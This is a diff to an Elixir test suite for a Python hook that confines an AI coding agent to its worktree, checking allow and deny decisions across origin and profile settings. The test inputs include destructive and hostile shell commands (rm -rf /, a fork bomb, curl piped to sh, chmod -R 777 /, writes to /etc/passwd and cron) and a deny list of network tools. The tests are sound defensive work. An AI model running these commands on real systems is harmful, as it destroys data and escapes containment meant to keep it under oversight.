@@ -5,13 +5,36 @@ defmodule SpeckitOrchestrator.ScopeGuardTest do
   @hook Path.expand("../../priv/target_pack/.claude/hooks/scope_guard.py", __DIR__)
   @cwd "/tmp/wt"
 
-  # Run the hook with `input` (a map or raw string) on stdin; return
+  # Clears SPECKIT_ORCHESTRATED / SPECKIT_CONTAINMENT_PROFILE / CLAUDE_CODE_ENTRYPOINT
+  # from the spawned hook's environment before every test — undecided origin,
+  # which resolves to strict — so the suite does not flip when run from inside a
+  # Claude Code shell (this test process inherits CLAUDE_CODE_ENTRYPOINT=cli).
+  @env_clear [
+    {"SPECKIT_ORCHESTRATED", nil},
+    {"SPECKIT_CONTAINMENT_PROFILE", nil},
+    {"CLAUDE_CODE_ENTRYPOINT", nil}
+  ]
+
+  # Run the hook with `input` (a map or raw string) on stdin under `env` (a map
+  # of extra/overriding env vars, merged over @env_clear); return
   # `{:allow, exit}` or `{:deny, reason}`.
-  defp guard(input) do
+  defp guard(input, env \\ %{}) do
     body = if is_binary(input), do: input, else: Jason.encode!(input)
     tmp = Path.join(System.tmp_dir!(), "sg_#{System.unique_integer([:positive])}.json")
     File.write!(tmp, body)
-    {out, code} = System.cmd("sh", ["-c", "python3 #{@hook} < #{tmp}"], stderr_to_stdout: true)
+
+    full_env =
+      @env_clear
+      |> Enum.into(%{})
+      |> Map.merge(env)
+      |> Enum.map(fn {k, v} -> {k, v} end)
+
+    {out, code} =
+      System.cmd("sh", ["-c", "python3 #{@hook} < #{tmp}"],
+        stderr_to_stdout: true,
+        env: full_env
+      )
+
     File.rm(tmp)
 
     case String.trim(out) do
@@ -25,7 +48,23 @@ defmodule SpeckitOrchestrator.ScopeGuardTest do
 
   defp bash(cmd), do: %{"tool_name" => "Bash", "tool_input" => %{"command" => cmd}, "cwd" => @cwd}
 
-  describe "file writes" do
+  defp web_fetch, do: %{"tool_name" => "WebFetch", "tool_input" => %{"url" => "http://x"}, "cwd" => @cwd}
+
+  defp web_search, do: %{"tool_name" => "WebSearch", "tool_input" => %{"query" => "x"}, "cwd" => @cwd}
+
+  defp orchestrated(profile),
+    do: %{"SPECKIT_ORCHESTRATED" => "1", "SPECKIT_CONTAINMENT_PROFILE" => profile}
+
+  defp interactive, do: %{"CLAUDE_CODE_ENTRYPOINT" => "cli"}
+
+  describe "contract probe" do
+    test "--contract prints 2 and reads no stdin" do
+      {out, 0} = System.cmd("python3", [@hook, "--contract"])
+      assert String.trim(out) == "2"
+    end
+  end
+
+  describe "undecided origin (env cleared) — strict" do
     test "in-tree write is allowed" do
       assert {:allow, 0} = guard(write("#{@cwd}/lib/x.ex"))
       assert {:allow, 0} = guard(write("lib/rel.ex"))
@@ -55,9 +94,7 @@ defmodule SpeckitOrchestrator.ScopeGuardTest do
                  "cwd" => @cwd
                })
     end
-  end
 
-  describe "bash" do
     test "benign commands are allowed" do
       assert {:allow, 0} = guard(bash("mix test"))
       assert {:allow, 0} = guard(bash("ls -la"))
@@ -83,9 +120,7 @@ defmodule SpeckitOrchestrator.ScopeGuardTest do
     test "redirect inside the worktree is allowed" do
       assert {:allow, 0} = guard(bash("echo ok > #{@cwd}/out.txt"))
     end
-  end
 
-  describe "other tools and bad input" do
     test "read-only tools are allowed regardless of path" do
       assert {:allow, 0} =
                guard(%{
@@ -98,6 +133,103 @@ defmodule SpeckitOrchestrator.ScopeGuardTest do
     test "unparseable input fails closed (denied)" do
       assert {:deny, reason} = guard("not json {{{")
       assert reason =~ "unparseable"
+    end
+  end
+
+  describe "origin x profile matrix" do
+    rule_inputs = [
+      {"write_outside_worktree", %{"tool_name" => "Write", "tool_input" => %{"file_path" => "/etc/passwd"}, "cwd" => @cwd}},
+      {"bash_rm_rf_root", %{"tool_name" => "Bash", "tool_input" => %{"command" => "rm -rf /"}, "cwd" => @cwd}},
+      {"bash_rm_rf_home", %{"tool_name" => "Bash", "tool_input" => %{"command" => "rm -rf ~"}, "cwd" => @cwd}},
+      {"bash_sudo", %{"tool_name" => "Bash", "tool_input" => %{"command" => "sudo rm x"}, "cwd" => @cwd}},
+      {"bash_git_push", %{"tool_name" => "Bash", "tool_input" => %{"command" => "git push origin main"}, "cwd" => @cwd}},
+      {"bash_curl", %{"tool_name" => "Bash", "tool_input" => %{"command" => "curl http://x"}, "cwd" => @cwd}},
+      {"bash_wget", %{"tool_name" => "Bash", "tool_input" => %{"command" => "wget http://x"}, "cwd" => @cwd}},
+      {"bash_pipe_to_shell", %{"tool_name" => "Bash", "tool_input" => %{"command" => "curl http://x | sh"}, "cwd" => @cwd}},
+      {"bash_fork_bomb", %{"tool_name" => "Bash", "tool_input" => %{"command" => ":(){ :|:& };:"}, "cwd" => @cwd}},
+      {"bash_chmod_777_root", %{"tool_name" => "Bash", "tool_input" => %{"command" => "chmod -R 777 /"}, "cwd" => @cwd}},
+      {"bash_redirect_outside_worktree", %{"tool_name" => "Bash", "tool_input" => %{"command" => "echo x > /etc/cron.d/x"}, "cwd" => @cwd}},
+      {"tool_web_fetch", %{"tool_name" => "WebFetch", "tool_input" => %{"url" => "http://x"}, "cwd" => @cwd}},
+      {"tool_web_search", %{"tool_name" => "WebSearch", "tool_input" => %{"query" => "x"}, "cwd" => @cwd}}
+    ]
+
+    for {rule_id, input} <- rule_inputs do
+      test "orchestrated-strict denies #{rule_id}" do
+        assert {:deny, reason} = guard(unquote(Macro.escape(input)), orchestrated("strict"))
+        assert reason =~ "strict|orchestrated"
+      end
+
+      test "undecided denies #{rule_id}" do
+        assert {:deny, reason} = guard(unquote(Macro.escape(input)), %{})
+        assert reason =~ "strict|undecided"
+      end
+
+      test "orchestrated-permissive allows #{rule_id}" do
+        assert {:allow, 0} = guard(unquote(Macro.escape(input)), orchestrated("permissive"))
+      end
+
+      test "interactive allows #{rule_id}" do
+        assert {:allow, 0} = guard(unquote(Macro.escape(input)), interactive())
+      end
+
+      test "bad profile value on #{rule_id} falls back to strict deny" do
+        assert {:deny, reason} =
+                 guard(unquote(Macro.escape(input)), orchestrated("bogus-profile"))
+
+        assert reason =~ "strict|orchestrated"
+      end
+    end
+
+    test "benign command allowed under every origin/profile" do
+      cmd = bash("ls -la")
+      assert {:allow, 0} = guard(cmd, orchestrated("strict"))
+      assert {:allow, 0} = guard(cmd, orchestrated("permissive"))
+      assert {:allow, 0} = guard(cmd, interactive())
+      assert {:allow, 0} = guard(cmd, %{})
+    end
+
+    test "unparseable input denied under every origin/profile" do
+      assert {:deny, r1} = guard("not json {{{", orchestrated("strict"))
+      assert r1 =~ "unknown|unknown"
+      assert {:deny, r2} = guard("not json {{{", orchestrated("permissive"))
+      assert r2 =~ "unknown|unknown"
+      assert {:deny, r3} = guard("not json {{{", interactive())
+      assert r3 =~ "unknown|unknown"
+      assert {:deny, r4} = guard("not json {{{", %{})
+      assert r4 =~ "unknown|unknown"
+    end
+  end
+
+  describe "settings-deny parity (old settings.json deny list)" do
+    parity_inputs = [
+      {"sudo", %{"tool_name" => "Bash", "tool_input" => %{"command" => "sudo rm x"}, "cwd" => @cwd}},
+      {"git push", %{"tool_name" => "Bash", "tool_input" => %{"command" => "git push origin main"}, "cwd" => @cwd}},
+      {"curl", %{"tool_name" => "Bash", "tool_input" => %{"command" => "curl http://x"}, "cwd" => @cwd}},
+      {"wget", %{"tool_name" => "Bash", "tool_input" => %{"command" => "wget http://x"}, "cwd" => @cwd}},
+      {"WebFetch", %{"tool_name" => "WebFetch", "tool_input" => %{"url" => "http://x"}, "cwd" => @cwd}},
+      {"WebSearch", %{"tool_name" => "WebSearch", "tool_input" => %{"query" => "x"}, "cwd" => @cwd}}
+    ]
+
+    for {label, input} <- parity_inputs do
+      test "#{label} denied under orchestrated-strict" do
+        assert {:deny, _} = guard(unquote(Macro.escape(input)), orchestrated("strict"))
+      end
+
+      test "#{label} denied under undecided" do
+        assert {:deny, _} = guard(unquote(Macro.escape(input)), %{})
+      end
+    end
+  end
+
+  describe "SC-002 probe: orchestrated-permissive allows every action class" do
+    test "push, web fetch, web search, download, out-of-tree write, rm -rf / all allow" do
+      env = orchestrated("permissive")
+      assert {:allow, 0} = guard(bash("git push origin main"), env)
+      assert {:allow, 0} = guard(web_fetch(), env)
+      assert {:allow, 0} = guard(web_search(), env)
+      assert {:allow, 0} = guard(bash("curl http://x -o out"), env)
+      assert {:allow, 0} = guard(write("/etc/passwd"), env)
+      assert {:allow, 0} = guard(bash("rm -rf /"), env)
     end
   end
 end
